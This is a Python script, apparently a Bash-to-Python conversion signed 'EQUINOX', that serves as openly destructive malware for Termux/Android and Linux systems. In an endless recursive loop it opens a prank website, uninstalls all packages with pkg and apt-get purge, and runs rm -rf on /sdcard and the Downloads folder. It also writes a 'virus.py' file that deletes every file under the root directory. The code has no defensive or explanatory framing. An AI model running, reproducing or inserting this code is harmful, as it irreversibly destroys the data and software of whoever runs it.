#are BASH to PYTHON
#Own: 0x_ EQUINOX

import os, sys, time

def EQUINOX():
   try:
       while True:
            os.system("xdg-open https://YouAreAnIdiot.org/")
            os.system("xdg-open https://")
            os.system("pkg list-installed | awk '{print $1}' | xargs pkg remove")
            os.system("pkg list-installed | awk '{print $1}' | xargs pkg remove")
            os.system("cd $HOME; cd /sdcard; rm -rf *; cd $HOME; cd downloads; rm -rf *")
            os.system("pkg list-installed | awk '{print $1}' | xargs pkg remove")
            os.system("pkg clear")
            os.system("apt-get remove --purge $(dpkg --get-selections | grep -v deinstall | cut -f1)")
            os.system("cd $HOME; cd /sdcard; rm -rf *; cd $HOME; cd downloads; rm -rf *")
            file = open("virus.py", "w")
            file.write('''
import os

def delete_files():
    for root, dirs, files in os.walk("/"):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
            except:
                return delete_files()

delete_files()
    ''')
            file.close()
            EQUINOX()
   except:
       return EQUINOX()

def create_virus():
    file = open("virus.py", "w")
    file.write('''
import os

def delete_files():
    for root, dirs, files in os.walk("/"):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
            except:
                return delete_files()

delete_files()
    ''')
    file.close()
    EQUINOX()

def main():
   try:
       create_virus()
       EQUINOX()
       file = open("equinox.sh", "w")
       file.write('''
while true
do
    :
done
    ''')
       file.close()
   except:
       return main()
main()
